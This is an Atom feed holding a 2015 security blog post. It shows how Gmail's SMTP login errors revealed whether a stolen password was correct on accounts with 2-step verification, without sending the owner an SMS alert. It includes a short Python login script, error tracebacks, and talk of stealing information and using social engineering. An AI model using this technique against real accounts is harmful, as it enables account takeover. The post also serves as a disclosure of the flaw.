<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">

  <title><![CDATA[Category: Bug | ZeroDay Cyber Research]]></title>
  <link href="http://z3r0d4y.com/blog/categories/bug/atom.xml" rel="self"/>
  <link href="http://z3r0d4y.com/"/>
  <updated>2015-05-09T15:34:23-04:00</updated>
  <id>http://z3r0d4y.com/</id>
  <author>
    <name><![CDATA[Ali Razmjoo]]></name>
    
  </author>
  <generator uri="http://octopress.org/">Octopress</generator>

  
  <entry>
    <title type="html"><![CDATA[Google Bug: Gmail 2-Step Verification Detector]]></title>
    <link href="http://z3r0d4y.com/blog/2015/02/04/google-bug-gmail-2-step-verification-detector/"/>
    <updated>2015-02-04T18:00:00-05:00</updated>
    <id>http://z3r0d4y.com/blog/2015/02/04/google-bug-gmail-2-step-verification-detector</id>
    <content type="html"><![CDATA[<p>Hello world! [ Including People , Robots, Zombies<span class="description">Dariush &amp; Arash</span>, Alien dudes if they exist, and my friends ], By the way, I decided to write about a Gmail Bug. It&rsquo;s not a vulnerability of Gmail but it&rsquo;s some kind of bug let us know if we hack a Gmail, we can login it or not without alert the Gmail owner. I talking about 2-Step verification, Imagine to grab a Gmail password and not be sure to login or not , victim might be use Gmail SMS auth service and when you click login, Google send victim a SMS which include a code to continue login. I got some way to test Gmail account before we login and test it if account have notification or not without any alert SMS. Keep reading to know how to do it.</p>

<!-- more -->


<p>As we know , Google SMTP can be used to login Gmail from anywhere .so we login from there[SMTP] and check what Gmail SMTP return to us. So now I use a python code to login my account that I activated 2-step protection on that and if anyone login, it should send me a SMS.</p>

<pre><code class="python gmail.py https://github.com/Ali-Razmjoo/z3r0d4y/blob/master/gmail.py">#!/usr/bin/python2.7
import smtplib
user = 'xxx@gmail.com'
passw = 'xxx'
smtp_host = 'smtp.gmail.com'
smtp_port = 587
server = smtplib.SMTP()
server.connect(smtp_host,smtp_port)
server.ehlo()
server.starttls()
server.login(user,passw)
</code></pre>

<p>And when run the script my result was:</p>

<pre><code class="python">Traceback (most recent call last):
  File "C:\Users\Ali\Desktop\gmail.py", line 22, in &lt;module&gt;
    server.login(user,passw)
  File "C:\Python27\lib\smtplib.py", line 614, in login
    raise SMTPAuthenticationError(code, resp)
smtplib.SMTPAuthenticationError: (534, '5.7.9 Application-specific password requ
ired. Learn more at\n5.7.9 http://support.google.com/accounts/bin/answer.py?answ
er=185833 w3sm2453216wjf.3 - gsmtp')
</code></pre>

<p>Ohhh , Greate , because it&rsquo;s just showing me check out app password url and didn&rsquo;t send me any SMS. So it means my password is not wrong ! But to be sure I&rsquo;m going to test this with wrong password.</p>

<pre><code class="python">Traceback (most recent call last):
  File "C:\Users\Ali\Desktop\gmail.py", line 22, in &lt;module&gt;
    a = server.login(user,passw)
  File "C:\Python27\lib\smtplib.py", line 614, in login
    raise SMTPAuthenticationError(code, resp)
smtplib.SMTPAuthenticationError: (535, '5.7.8 Username and Password not accepted
. Learn more at\n5.7.8 http://support.google.com/mail/bin/answer.py?answer=14257
 bv6sm2577733wjb.30 - gsmtp')
</code></pre>

<p>Now you can see different result. And let me test it with another Gmail which for a long time I didn&rsquo;t use.</p>

<pre><code class="python">Traceback (most recent call last):
  File "C:\Users\Ali\Desktop\gmail.py", line 22, in &lt;module&gt;
    a = server.login(user,passw)
  File "C:\Python27\lib\smtplib.py", line 614, in login
    raise SMTPAuthenticationError(code, resp)
smtplib.SMTPAuthenticationError: (534, '5.7.14 &lt;https://accounts.google.com/Cont
inueSignIn?sarp=1&amp;scc=1&amp;plt=AKgnsbu3u\n5.7.14 pntQhm8PgwhQoRK6G4JaqbL5rcYK91sfB3
SZJZlGQcF2y3WXgUa9vOyex8KMlF-labONEg\n5.7.14 -yKrWWgN7PtH55A1TqK3e1gfitBHKmghSUW
4AgNsmZ6qASoci8_lqhS6MCLniXpgqW_OPs\n5.7.14 dLg2YvDJ_QZpRQRV_i0l82hy22KcvUvDwscq
ENWFs-dk6nrJrF_thrThuzS555KIFMnkEk\n5.7.14 wueyxESEpgPC6RGqcwl9Pfo4kWTg&gt; Please
log in via your web browser and\n5.7.14 then try again.\n5.7.14 Learn more at\n5
.7.14 https://support.google.com/mail/bin/answer.py?answer=78754 bv6sm2501216wjb
.30 - gsmtp')
</code></pre>

<p>Now Google tells me use the browser to login. I don&rsquo;t care about error. But there&rsquo;s a point! What if we use a Gmail account which we didn&rsquo;t ever use on my PC till now. So I will use my friend&rsquo;s Gmail account and watch the result.
<code>python
Traceback (most recent call last):
  File "C:\Users\Ali\Desktop\gmail.py", line 22, in &lt;module&gt;
    a = server.login(user,passw)
  File "C:\Python27\lib\smtplib.py", line 614, in login
    raise SMTPAuthenticationError(code, resp)
smtplib.SMTPAuthenticationError: (534, '5.7.9 Application-specific password requ
ired. Learn more at\n5.7.9 http://support.google.com/accounts/bin/answer.py?answ
er=185833 bo3sm2561309wjb.44 - gsmtp')
</code></p>

<p>It seems my friend&rsquo;s been given me true password but he activated Gmail SMS auth. So now we can see that Google didn&rsquo;t work hard on this way. When we have true password, we can login and steal information and if victim using Gmail SMS auth, however, we know what&rsquo;s the true password and only need a little social engineering to login and steal information.
All we need now it&rsquo;s a script to make it automatic check the Gmail account to login with this script and read error to see what happen. If you think I&rsquo;m going to make a automatic script for you, and put code here, I should tell you that, I am NOT.<br></p>

<h3>Reference</h3>


<p><a href="http://z3r0d4y.com/">ZCR</a> <span class="description">Zeroday Cyber Research</span>
<br><br><a href="mailto:Ali[dot]Razmjoo1994[at]Gmail[dot]Com">Ali Razmjoo</a>
<br><br>Last edit on: 2015/4/1 @13:42</p>
]]></content>
  </entry>
  
</feed>
